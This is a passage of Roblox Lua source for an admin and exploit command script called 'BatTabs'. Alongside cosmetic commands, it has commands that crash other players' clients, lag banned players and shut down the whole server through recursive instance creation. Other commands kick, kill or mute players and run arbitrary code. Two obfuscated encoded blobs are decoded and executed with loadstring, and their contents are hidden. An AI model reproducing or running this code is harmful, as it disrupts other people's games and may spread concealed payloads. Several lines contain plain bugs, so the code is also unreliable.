bg.Size = UDim2.new(4, 0, 2.5, 0)
bg.StudsOffset = Vector3.new(-4, 2, 0)
local bg2 = Instance.new("BillboardGui", mainPart)
bg2.Adornee = mainPart
bg2.Name = "CHATGUIBG2"
bg2.Size = UDim2.new(4, 0, 2.5, 0)
bg2.StudsOffset = Vector3.new(-4, 4.5, 0)
local text = Instance.new("TextLabel", bg)
text.Size = UDim2.new(3, 0, 0.5, 0)
text.FontSize = "Size18"
text.TextScaled = true
text.TextTransparency = 0
text.BackgroundTransparency = 1
text.TextTransparency = 0
text.TextStrokeTransparency = 0
text.Font = "Arial"
text.TextColor = BrickColor.new("Institutional white")
text.Text = " "
Message = msg:sub(1)
if #Message >50 then return end
for i = 0, #Message, 1 do
wait(0.01)
text.Text = string.gsub("["..LocalPlayer.Name.."]: "..Message:sub(0, i),'fuck','fuck')
end
wait()
coroutine.resume(coroutine.create(function()
for i = 0, 5, 0.05 do
if bg ~= nil then
if bg2 ~= nil then
wait()
bg2.StudsOffset = bg2.StudsOffset + Vector3.new(0, 0.05, 0)
end
bg.StudsOffset = bg.StudsOffset + Vector3.new(0, 0.05, 0)
end
end
end))
for i=text.TextTransparency,1,0.02 do
wait()
text.TextTransparency = i
text.TextStrokeTransparency = i
end
if bg == nil then return end
bg:Destroy()
if bg2 == nil then return end
bg2:Destroy()
end
 
LocalPlayer.Chatted:connect(chatgui)
 
AddCmd("Message","m","Make a message over the screen",
function(plrs, msg)
Message = msg
NewS([[
a = Instance.new("Message", workspace)
a.Text = ]].."[ "..LocalPlayer.Name.." ]: "..Message, workspace)
end
)
 
AddCmd("Hint","h","Make a message at top of the screen",
function(plrs, msg)
Hint = msg
NewS([[
a = Instance.new("Hint", workspace)
a.Text = ]]..Hint, workspace)
end
)
 
AddCmd("Commands","cmds","Show the list of commands",
function()
Dismiss()
for i, v in pairs(Cmds) do
Output(v["Name"],
function()
Output("Description: "..v["Desc"], __)
Output("Usage: "..v["Say"], __)
Output("Name: "..v["Name"], __)
end)
end
end
)
 
AddCmd("Rejoin player","rej","Rejoin the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'TeleportService':Teleport(game.PlaceId)", plr.Backpack)
end
end
end
)
 
 
AddCmd("Nil players","nilp","Check nil players",
        function()
                NewS([[
                        local mod = Instance.new("Model")
                        mod.Name = "NilPlayers"
                        pcall(function()
                                for k,v in pairs(game:GetService("NetworkServer"):GetChildren()) do
                                        pcall(function()
                                                local p = v:GetPlayer()
                                                if p.Parent ~= game.Players then
                                                        local a = Instance.new("StringValue", mod)
                                                        a.Value = "NIL: "..p.Name
                                                else
                                                        local a = Instance.new("StringValue", mod)
                                                        a.Value = p.Name
                                                end
                                        end)
                                end
                        end)
                        mod.Parent = game:GetService("Lighting")
                        script:Destroy()
                ]], game.Workspace)
                local np = false
                for i=1,5,0.1 do
                        np = game:GetService("Lighting"):findFirstChild("NilPlayers")
                        if np then break end
                        wait(0.1)
                end
                if not np then
                        return Output("Something went wrong! F\5U\5C\5K!","Really red")
                end
                for k,v in pairs(np:GetChildren()) do
                        if v:IsA("StringValue") then
                                if v.Value:lower():sub(1,4) == "nil:" then
                                        Output(v.Value,"Really red")
                                else
                                        Output(v.Value)
                                end
                        end
                end
                wait()
                np:Destroy()
        end
)
 
 
AddCmd("Create base","base","Create the base",
function()
a = Instance.new("Part")
a.Parent = Workspace
a.Name = "Base"
a.Position = Vector3.new(0, 0.6, 0)
a.Size = Vector3.new(1002, 0, 1002)
a.Material = "Grass"
a.Anchored = true
a.BrickColor = BrickColor.new("Dark green")
end
)
 
AddCmd("Ping","ping","Ping something",
function(plrs, msg)
if msg == "" then
Output("pong", __)
else
Output(msg, __)
end
end
)
 
AddCmd("Dismiss","dis","Dismiss tabs",
function()
Dismiss()
end
)
 
AddCmd("Probe mode", "probe", "Be a ball and fly around",
function()
probemode = true
Dismiss()
if LocalPlayer.Character then LocalPlayer.Character = nil end
if workspace.CurrentCamera == nil then return end
local camera = workspace.CurrentCamera
local probe = Instance.new("Part", workspace)
M = Instance.new("SpecialMesh", probe)
M.MeshId=("http://www.roblox.com/asset/?id=13640868")
M.TextureId=("http://www.roblox.com/asset/?id=18987684") -- i found a blue sparkel time fedora
M.Scale = Vector3.new(2, 2, 2)
probe.TopSurface = 0
probe.Anchored = true
probe.BottomSurface = 0
probe.Name = LocalPlayer.Name.."'s probe"
local rotation = 0
local bbg = Instance.new("BillboardGui", probe)
bbg.Size = UDim2.new(3, 0, 3 ,0)
bbg.ExtentsOffset = Vector3.new(0, 2, 0)
local txt = Instance.new("TextLabel", bbg)
txt.FontSize = "Size24"
txt.Font = "SourceSansBold"
txt.Text = LocalPlayer.Name
txt.BackgroundTransparency = 1
txt.TextColor = BrickColor.new("Institutional white")
txt.TextStrokeTransparency = 0
txt.Size = UDim2.new(1,0,1,0)
local pl = Instance.new("PointLight", probe)
pl.Shadows = true
pl.Range = 20
coroutine.wrap(function()
while pl ~= nil do
pl.Color=Color3.new(math.random(),math.random(),math.random())
wait(0.8)
end
end)()
coroutine.wrap(function()
while LocalPlayer.Character == nil and probe.Parent == workspace and probe ~= nil and game:service'RunService'.Stepped:wait() do
probe.CFrame = camera.Focus * CFrame.Angles(0, rotation, 0)
rotation = rotation + 0.1
end
if camera then
camera:Destroy()
end
probe:Destroy()
end)()
end
)
 
AddCmd("Make your character","char","Creates your character",
function()
if workspace.CurrentCamera == nil then return end
local camera = workspace.CurrentCamera
local new_char = game:service("InsertService"):LoadAsset(68452456):GetChildren()[1]
local human = new_char.Humanoid
human.Parent = nil
new_char.Name = LocalPlayer.Name
wait()
human.Parent = new_char
camera.CameraSubject = human
camera.CameraType = "Custom"
new_char.Parent = workspace
local pl = Instance.new("PointLight", new_char.Head)
pl.Range = 24
pl.Shadows = true
LocalPlayer.Character = new_char
new_char:MakeJoints()
new_char.Torso.BrickColor = torsocolor
new_char["Left Leg"].BrickColor = leftlegcolor
new_char["Right Leg"].BrickColor = rightlegcolor
new_char["Left Arm"].BrickColor = leftarmcolor
new_char["Right Arm"].BrickColor = rightarmcolor
new_char.Head.BrickColor = headcolor
for i,v in pairs(Clothes) do
v:Clone().Parent = new_char
end
probemode = false
end
)
 
AddCmd("Stop the commands","cremove","Remove the commands",
function()
    Output("Your Making a Bad Mistake",
    function()
        Output("Are You Sure That You Wan't To Remove The Best Admin?",
        function()
            Output("Are You 9999% Sure That You Want This???",
            function()
                for i,v in pairs(getfenv(1)) do
                    getfenv(1)[i] = nil
                end
                script.Disabled = true
                LocalPlayer = NO_PLAYER
                script:findFirstChild(SourceName).Value = " "
                script.Disabled = true
                tabmodel:ClearAllChildren()
                tabmodel:Destroy()
                connection:disconnect()
                Tabs = {}
                Cmds = {}
                Banlist = {}
                fukhed.all = true
                coroutine.resume(coroutine.create(function()
                    while wait(0.1) do
                        Dismiss()
                    end
                end))
            end)
        end)
    end)
end)
 
AddCmd("ForceField","ff","Give forcefield to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
Instance.new("ForceField", plr.Character)
end
end
end
)
 
AddCmd("Sparkles","sparkles","Give sparkles to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
Instance.new("Sparkles", plr.Character.Torso)
end
end
end
)
 
AddCmd("Un-Sparkles","unsparkles","Remove sparkles from player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
pcall(function()
for j, k in pairs(plr.Character.Torso:GetChildren()) do
if k:IsA("Sparkles") then
k:Destroy()
end
end
end)
end
end
end
)
 
AddCmd("Crash player","crash","Crash the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([==[
        game:GetService("RunService").RenderStepped(function()
    Delay(0, function() return end)
    end)]==], plr.Backpack)
end
end
end
)
 
AddCmd("Respawn player","respawn","Respawn the player",
function(plrs)
for _, plr in pairs(plrs) do
NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
end
end
)
 
AddCmd("Mute player","mute","Block the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, false)", plr.Backpack)
end
end
end
)
 
AddCmd("Unmute player","unmute","Unblock the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, true)", plr.Backpack)
end
end
end
)
 
AddCmd("Un-ForceField","unff","Remove the forcefield that you gave to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
pcall(function()
for _,v in pairs(plr.Character:GetChildren()) do
if v:IsA("ForceField") then
v:Destroy()
end
end
end)
end
end
end
)
 
AddCmd("Gear","gear","Give gear to player",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local asset = msg:sub(tonumber(keypos+1))
for _,plr in pairs(plrs) do
if plr and plr.Backpack then
local obj = game:service("InsertService"):LoadAsset(asset)
pcall(function()
for a,g in pairs(obj:children())do
if g:IsA("Tool") or g:IsA("HopperBin") then
g.Parent = plr.Backpack
end
end
end)
end
end
end
)
 
 
AddCmd("God player","god","Make the player immortal",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Humanoid then
plr.Character.Humanoid.MaxHealth = math.huge
end
end
end
)
 
AddCmd("Ungod player","ungod","Make the player mortal",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character.Humanoid.MaxHealth = 100
end
end
end
)
 
AddCmd("Kick player","kick","Kick a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SerCoreGuiEnabled(3,false)", plr.Backpack)
plr:Destroy()
end
end
end
)
 
AddCmd("Kill player","kill","Kill a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character:BreakJoints()
end
end
end
)
 
AddCmd("Punish player","punish","Remove character of a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character:Destroy()
end
end
end
)
 
AddCmd("Admin a player","admin","Give admin to a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
a = script:Clone()
a.Parent = plr.Backpack
Output("You gave admin to: "..plr.Name, __)
end
end
end
)
 


AddCmd("Fix cam","fcam","Fix anyone's cam",
function(plrs, msg)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([[
game.Workspace.CurrentCamera:Destroy()
cam = Instance.new("Camera", workspace)
cam.Name = "CurrentCamera"
cam.FieldOfView = 70
cam.CameraType = "Custom"
cam.CameraSubject = game.Players.LocalPlayer.Character.Humanoid]], plr.Backpack)
end
end
end
)
local z={["&"]=0,["%"]=1,["="]=2,["!"]=3,["*"]=4,["+"]=5,["?"]=6,["-"]=7,["~"]=8,["#"]=9,["$"]=10,[")"]=11,["^"]=12,["("]=13,["_"]=14,["@"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
"??+-_?!?*-#?@?_?&=!?=-+?%?*-+?!+@?+-_?*?~=#A*#=$&#&!+@?+-_?*?(!#*_?!-*-%?_?!?+?_=_?+?--~A=!+@?+-_?*?==^=-*%?(?+?)+==-+@?=-)?!-&-%?!?+?==(+#=$&#&!+@?+-_?*?)+==_*%?(?+?==(+(!~A=!++?=-?-+?=-@+!+#-!-*-+?(?@+!+@?+-_?*?==#=$&#&!+@?+-_?*?)+==&+#?*-!?~?==(+(!~=%!#=$&#&!+@?+-_?*?)+==!+@?+-_?*?#**?==(+(!~===~?*-*-&-$!@=@=------_==-@?=?^?@?~-_=!?@?(?@=%?!-!-+?*-@=@!#?*?(!==_=_=*-@?_?+-(?=?+?=-~=#***#=#=$&#&!+@?+-_?*?)+==?+@?^?+-(?+?==(+(!~=&!_=+!#=$&#&--%?#?*-~=#=$&#&!+@?+-_?*?$!&+^?%?#-~=#=$&+?_?*?"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()
function CheckForExistingSound()
    for _,Child in pairs(Game["Workspace"]:GetChildren()) do
        if(Child["ClassName"]==("Sound"))then
            Child:Pause()
            Child["PlayOnRemove"]=(false);
            wait()
            Child:Destroy()
        end
    end
end
function ShowMusicList()
    Dismiss()
    Output("Tacos",function()
        CheckForExistingSound()
        createSound(142295308)
    end)
    Output("Tsunami Hardstyle",function()
        CheckForExistingSound()
        createSound(142720946)
    end)
    Output("Headhunterz - Fear",function()
        CheckForExistingSound()
        createSound(146180801)
    end)
    Output("Headhunterz - Dragonborn",function()
        CheckForExistingSound()
        createSound(145060711)
    end)
    Output("Eminem - Rap God",function()
        CheckForExistingSound()
        createSound(143647605)
    end)
    Output("Eminem - I'm Not Afraid",function()
        CheckForExistingSound()
        createSound(131149175)
    end)
    Output("Dj Swoom - I'm Blue",function()
        CheckForExistingSound()
        createSound(150526348)
    end)
    Output("Pirates of the Caribbean",function()
        CheckForExistingSound()
        createSound(142328554)
    end)
    Output("Turn Down For What",function()
        CheckForExistingSound()
        createSound(143959455)
    end)
    Output("Chamillionaire - Ridin' Dirty",function()
        CheckForExistingSound()
        createSound(143735700)
    end)
    Output("Eminem - When I'm Gone",function()
        CheckForExistingSound()
        createSound(153116498)
    end)
    Output("Gas Pedal",function()
        CheckForExistingSound()
        createSound(142489916)
    end)
    Output("Eminem & The Script Hall of Fame Remix",function()
        CheckForExistingSound()
        createSound(152879311)
    end)
        Output("Let it Go",function()
                CheckForExistingSound()
                createSound(150320143)
        end)
end
AddCmd("Musiclist","musicl","Shows the Possible Sounds to Play",
function()
    ShowMusicList()
end)
AddCmd("AFK","afk","Ping yourself as afk",
function()
Dismiss()
for i = 1,8 do
wait()
Output("AFK", __)
end
end
)
 
AddCmd("Back","back","Ping yourself as back",
function()
Dismiss()
for i = 1,8 do
wait()
Output("Back", __)
end
wait(3)
Dismiss()
end
)
 
AddCmd("Ban a player","ban","Kicks a player when he enters",
function(plrs, msg)
for _,v in pairs(plrs) do
if v then
table.insert(Banlist,v.Name)
Output('Banned | '..v.Name,__)
else
Output(Error)
end
end
end
)
 
local charMap = {["+"] = 0, ["^"] = 1, ["%"] = 2, [")"] = 3, ["*"] = 4, ["$"] = 5, ["-"] = 6, ["_"] = 7, ["#"] = 8, ["&"] = 9, ["@"] = 10, ["("] = 11, ["?"] = 12, ["~"] = 13, ["!"] = 14, ["="] = 15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
"?-=-)-^-?-+%&-~)~%^)()?-=-^-*-)_*_%_&-!-_-#%)_*_%_&-!-_-!%_-)_$_%-#B%!*!_~*~!~^&&~?@(&!&_@_~&~@A?@~@~_~~?^~&?&#)~)~+~-?@?%?##+?(A?#(~_-_(=?=!!@!)=$@?!!(?@!@-($!-!-~_~*!)!=~*~_~!?~#-~$~^~-?&?+?$#?(-?-?^($_~-@$@$(*-*~&^(~=$##$&$?$?$^^!A=-+&%#)$)*%!%~%!~=^=^!+!+?$+)%)-)#^)^_+&+==~($+)+!=%=*=@!!@*!~!?!-~&&+&&@#?*?=&$?#($($_(-#&*@=@%@$@$@~*%&)&_#?#()^*$#*&)_*_#-~-?^?$%%*^_)#$?*^$+$_*_)-*_)-)#C)**~^?$+)%)-))%$%+%#?_^)+!+^+*+*+!@*(!#-!^=+%$!-~~^%!)~$~+~-#)#+-#(~(?(#(#?&@?$?$$_*$+-A@(-*@$!)!_$#?^$#~(A?-)_)%+%~=!)+-($)$*$=*==$==!~!)=)!!^?$+)%)-)+!~(*^#-?_&+(@?!!+&+^+%+~=~@)@+~?~_!@C~$#@?+~&_%?%(^(!@$-)@-(&$^(%A&!#+&*&!_@*_*$*+*()^#^%&_?$?$*-+-&$*$!*~*&*!)_*!)!%_)-=^=-=$)_B~?#+*+@?_@#!?$!-$+~=!=&=&@=&+~@A~+~#~%~-?~_~?*?^_!--?(#)@+(!@?@@@@&!*(#@#=#_###%&*)@)@%$-^-_%*+$*_-%-@$($-$-+?=?%_)+*~)=%^)!-+*+*%**~?%!~--&)@)~))?&?&(*=+=-()&@!=!^!)#!&(#%&$#!#=_-#~(&?=(^(=(^(*(+(_-=&%-=&+_&&#$($%--&-#%&+&@#)#%)%#+#(_=-^__-(%~$=$$$)--^)^($&$*$#*@*+**+$)&*^*=%="
,"!_%@!&!!!)!!^(~*~??(~$^@~#~#?^+_+@=!+=^#($(^(=@=-__(-$__-=-_@*((@!&~@+@*@^@&$%&-$*&--+&+$*$?$?$^&%#=#!#&#)#))*#)#=_*___!-))--&-+-=-)%^%@-&-$-@$~$*$&^(*+-&$#*&+%*-+-+%^#+++?)@=*=~!~=!=~=!!#%=%)%-!*!^!+!%#(#+#(#!__#+?!?-?@(@?!()?^?@_*(&_#((#-(__?_$#((~@((((_(%()-$($(%(#@?@*@@-!&%@@&@@=$!$#@#@$@(&=&_&~$+&-@+@+&%$?#^$%$)$($*$!*(#@*$*=)+$%$%$**=__#?_+*=)~)~)%%?%%%!%%%?%--$_!-)-*_&-=-!-#%)-&%&-~)&-(%^)()%_$-*_$_%_!-+%)_*_%_&-!-_-!%)-#-^-%_#%#%)_*_%_&-!-_-!%%-&_*_$-#%)-&%(%~%^)^)#)(%&-&%$%+%%)$)-)&%$-!-*-&%&%#%&%"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(charMap[lo]+charMap[hi]*16)end)))),getfenv())()
 
AddCmd("Shutdown the game","sd","Shutdown the game",
function()
NewS([[ local function BufferOverflow(object)
                object.DescendantAdded:connect(BufferOverflow)
                Instance.new("IntValue", object)
        end
        BufferOverflow(Game)
]], workspace)
end
)
 
AddCmd("Check source","chks","Check if the source is found",
function()
if found then
Output("Source is found")
else
Output("Source is not found")
end
end
)
 
AddCmd("Say bye to everyone","bye","Say bye to everyone",
function()
Dismiss()
for i = 1,8 do
Output("Bye", __)
end
end
)
 
AddCmd("Check source name","chksn","Check the source name",
function()
Output(SourceName, __)
end
)
 
AddCmd("Change source name","csn","Change the source name",
function(plrs, msg)
SourceName = tostring(msg)
end
)
 
AddCmd("Kick player list","klist", "Show a kick player list",
function()
Dismiss()
Output("Click on the player name that you want to kick", __)
for _,v in pairs(game:GetService("Players"):GetChildren()) do
Output(v.Name,
function()
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, false)", v.Backpack)
v:Destroy()
end)
end
end
)
 
AddCmd("Script","script","Execute a Script",
function(plrs, msg)
NewS(msg, workspace)
end
)
 
AddCmd("LocalScript","local","Execute a LocalScript",
function(plrs, msg)
NewLS(msg, LocalPlayer.Backpack)
end
)
 
AddCmd("Execute", "exe","Execute a LocalScript for admin",
function(plrs, msg)
a,b = ypcall(function()
loadstring(msg)()
end) if not a then Output(b,"Bright red") end
end
)
 
 
AddCmd("#Commands","#cmds","See how much are commands in this admin",
function()
Output(#Cmds, __)
end
)
 
AddCmd("Clean workspace","clean","Clean everything in workspace except terrain",
function()
NewS([[
for _,v in pairs(game.Workspace:GetChildren()) do
if v.Name ~= "Terrain" then
v:Destroy()
end
end
]],workspace)
wait(1)
a = Instance.new("Part")
a.Parent = Workspace
a.Name = "Base"
a.Position = Vector3.new(0, 0.6, 0)
a.Size = Vector3.new(1002, 0, 1002)
a.Material = "Grass"
a.Anchored = true
a.BrickColor = BrickColor.new("Dark green")
NewS([[
for _,v in pairs(game.Players:GetChildren()) do
v:LoadCharacter()
end
]], workspace)
end
)
 
BSoDBanList = {"Paej"}


AddCmd("BSoD BanList","bbl","Show BSod banned players",
	function()
		Showbb()
	end
)
 

AddCmd("'BSoD' ban","bb","BSoD ban a player",
function(plrs, msg)
for _,v in pairs(plrs) do
if v then
table.insert(BSoDBanList,v.Name)
Output('|BSoD Banned | '..v.Name,__)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS(BSoDSource, plr.Backpack)
else
Output(Error)
end
end
end
end
end
)

function Showbb()
	Dismiss()
	for _,v in pairs(BSoDBanList) do
		Output(v,nil, function() 
			Dismiss()
			Output(v)
			Output("Un-Ban","Really red", function()
				table.remove(BSoDBanList, _)
			end)
			Output("Back","Really red", function()
				Showbb()
			end)
		end)
	end
end

AddCmd("Script Help","sh","Help everyone with scripts",
function()
Dismiss()
for i = 1,1 do
wait()
Output("Script Help:", __)
Output("Google ROBLOX Script Bot and download it.", __)
Output("Find a script using ROBLOX Catalog.", __)
Output("Open ROBLOX Studio.", __)
Output("Edit any place and insert your script.", __)
Output("Copy your ENTIRE script.", __)
Output("Paste the script in the text box.", __)
Output("Select the 'Local Script' box, if the script it local.", __)
Output("Name your script and press 'Run Script'.", __)
Output("Enjoy showing off your script!", __)
end
end
)
 
AddCmd("Darkhearts","dh","Gives Darkhearts",
function()
Dismiss()
for i = 1,1 do
Output("Darkhearts Given",__)
local obj = game:service("InsertService"):LoadAsset(108149175)
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = LocalPlayer.Backpack end end
end
end
)
 
AddCmd("Machete","machete","Gives Machete",
function()
Dismiss()
for i = 1,1 do
Output("Machete Given",__)
local obj = game:service("InsertService"):LoadAsset(123234673)
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = LocalPlayer.Backpack end end
end
end
)
 
AddCmd("Gear","gear","Give gear to player",
        function(plrs, msg)
                local keypos = msg:find(key)
                local targPlayers = msg:sub(1,keypos-1)
                local plrs = getPlayers(targPlayers)
                local asset = msg:sub(tonumber(keypos+1))
                for _,plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                local obj = game:service("InsertService"):LoadAsset(asset)
                                pcall(function()
                                        for a,g in pairs(obj:children())do
                                                if g:IsA("Tool") or g:IsA("HopperBin") then
                                                        g.Parent = plr.Backpack
                                                end
                                        end
                                end)
                        end
                end
        end
)
 
AddCmd("Dark Character","dark","Make Character Dark",
function()
Dismiss()
for i = 1,1 do
Output("Character is Now Dark",__)
player=game.Players.LocalPlayer
char=player.Character
Color=BrickColor.new("Grey")
Color2=BrickColor.new(Color3.new(0,0,0))
model=Instance.new("Model")
model.Name="Suit"
model.Parent=char
d=0
Debounce=true
fake=char.Head:clone()
pcall(function() fake.face:remove() end)
char.Head.Transparency=1
fake.Parent=model
fake.Transparency=0
w=Instance.new("Weld")
w.Part1=fake
w.Part0=char.Head
w.Parent=char
fake.Mesh.Scale=fake.Mesh.Scale+Vector3.new(-0.01,-0.01,-0.01)
fake.BrickColor=Color2
char.Head.Changed:connect(function(p)
if p=="BrickColor" then
wait()
pcall(function()
char.Head.face:Remove()
char.Torso.roblox:remove()
char["Shirt Graphic"]:remove()
end)
char.Humanoid.WalkSpeed=25
char.Humanoid.MaxHealth=math.huge
char.Humanoid.Health=math.huge
for _,v in pairs(char:children()) do
if v.className=="Hat" then
v:remove()
elseif v:IsA("Part") then
v.BrickColor=Color2
v.TopSurface="Smooth"
v.BottomSurface="Smooth"
elseif v:IsA("Shirt") or v:IsA("Pants") then
v:remove()
end
end
end
end)
char.Head.BrickColor=Color2
Tor=Instance.new("Part")
Tor.Size=Vector3.new(1,1,1)
Tor.BrickColor=Color2
Tor.Reflectance=0
Tor.Transparency=0
Tor.CanCollide=false
Tor.Parent=char
Mesh=Instance.new("SpecialMesh")
Mesh="http://www.roblox.com/asset/?id=96102993"
Mesh.Scale=Vector3.new(1.05,1.05,1.05)
Mesh.Parent=Tor
w = Instance.new("Weld")
w.Parent = char["Head"]
w.Part0 = w.Parent
w.Part1 = Tor
w.C0 = CFrame.new(0,0.35,0)
end
end
)
 
AddCmd("NoClip Character","nclip","Make Character NoClip",
function()
Dismiss()
for i = 1,1 do
Output("Character is Now NoClipped",__)
wait(1)
 
nam = game.Players.LocalPlayer.Name
 
coroutine.wrap(function()
while wait() do
for a, b in pairs(Workspace[nam]:GetChildren()) do
if b:FindFirstChild('Handle') then
b.Handle.CanCollide = false
end
end
end
end)()
 
Workspace[nam].Humanoid.Changed:connect(function()
Workspace[nam].Humanoid.WalkSpeed = 16
end)
 
game:GetService('Players').LocalPlayer.PlayerGui.ChildAdded:connect(function(asd)
delay(0, function()
if asd.Name ~= 'OutputGUI' then
asd:Destroy()
end
end)
end)
 
game:GetService('RunService').Stepped:connect(function()
Workspace[nam].Torso.CanCollide = false
Workspace[nam].Head.CanCollide = false
end)
 
Workspace[nam].Torso.Changed:connect(function()
Workspace[nam].Torso.CanCollide = false
Workspace[nam].Head.CanCollide = false
end)
end end
)
 
AddCmd("Remove Tools","rt","Remove current tools",
function()
Dismiss()
pcall(function()
LocalPlayer.Backpack:ClearAllChildren()
end)
end
)
 
function Output(Txt,func)
P=Instance.new("Part",tabmodel)
P.Shape=("Ball")
P.Anchored=true
P.CanCollide=false
if probemode==false then
if LocalPlayer.Character.Torso then
P.Position=LocalPlayer.Character.Torso.Position
elseif LocalPlayer.Character.Torso==nil then return end
elseif probemode==true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
P.Position=game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").Position
elseif game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe")==nil then return end
else
return
end
M=Instance.new("SpecialMesh",P)
M.MeshId=("http://www.roblox.com/asset/?id=21057410")
M.TextureId=("http://www.roblox.com/asset/?id=21057378")
M.Scale=Vector3.new(2,2,2)
Instance.new("PointLight",P)
bg=Instance.new("BillboardGui",P)
bg.Adornee=tab
bg.Size=UDim2.new(8,0,7.5,0)
bg.StudsOffset=Vector3.new(0,1,0)
text=Instance.new("TextLabel",bg)
text.Size=UDim2.new(1,0,0.2,0)
text.FontSize=("Size18")
text.BackgroundTransparency=1
text.Font=("Legacy")
text.TextStrokeTransparency=0
text.TextColor=BrickColor.new("Institutional white")--the first thing im going to work on tommrow is the dismiss 1:16
text.Text=Txt
Click=Instance.new("ClickDetector",P) -- kk what time? ok it's 2:28
Click.MaxActivationDistance=(math.huge)
Click.MouseClick:connect(function(Plr)
if Plr.Name==LocalPlayer.Name then
Dismiss()
if func~=nil then
    func=func
    func()
end
end
end)
table.insert(Tabs,P)
end
 
function getPlayers(msg)
local plrs = {}
if msg == "me" then
table.insert(plrs, LocalPlayer)
elseif msg == "all" then
plrs = game:GetService("Players"):GetChildren()
elseif msg == "noobs" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "veterans" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v ~= LocalPlayer then
table.insert(plrs, v)
end
end
else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name:lower():sub(1,#msg) == msg:lower() then
table.insert(plrs, v)
end
end
end
return plrs
end
 
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
end
 
LocalPlayer.Chatted:connect(function(m)
for i,v in pairs(Cmds) do
if v["Say"]..key == m:sub(1, #v["Say"]+#key) then
v["Func"](getPlayers(m:sub(#v["Say"]+#key+1)), m:sub(#v["Say"]+#key+1))
end
end
end)
       
for i = 0,8,1 do
wait(0.01)
end
Output("Welcome BatTabs!!!", __)
Output("Created by badbatmantoo", __)
Output("New Updates : "..Updates, __)
Output("User: "..LocalPlayer.Name, __)
 
tabmodeldebounce = false
modeldebounce = false
game:service'RunService'.Stepped:connect(function()
if modeldebounce then return end
rot = (rot % 100) + 0.5
if tabmodel.Parent ~= workspace then
modeldebounce = true
tabs = {}
tabmodel = Instance.new("Model", workspace)
tabmodel.Name = "Tablets"
tabs = {}
wait()
modeldebounce = false
end
end)
 
rot = 0
coroutine.resume(coroutine.create(function()
game:GetService("RunService").Stepped:connect(function()
if probemode == false then
if LocalPlayer.Character then
if LocalPlayer.Character:findFirstChild("Torso")  then
rot = rot + 0.0001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = LocalPlayer.Character.Torso.CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
rot = rot + 0.0001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end)
end))
 
Game["Players"].PlayerAdded:connect(function(newPlr)
    for _,BannedPlr in pairs(Banlist) do
        if(newPlr["Name"]==BannedPlr)then
            if(newPlr["Name"]~=("iLordVex"))then
                newPlr:WaitForChild("Backpack")
                NewLS(LagSource,newPlr["Backpack"])
                Output("The Banned Player ["..newPlr["Name"].."] has Tried to Enter the Server",__)
            end
        elseif(newPlr["Name"]~=BannedPlr)then
            Output("["..newPlr["Name"].."] has Entered the Server.",__)
        end
    end
end)
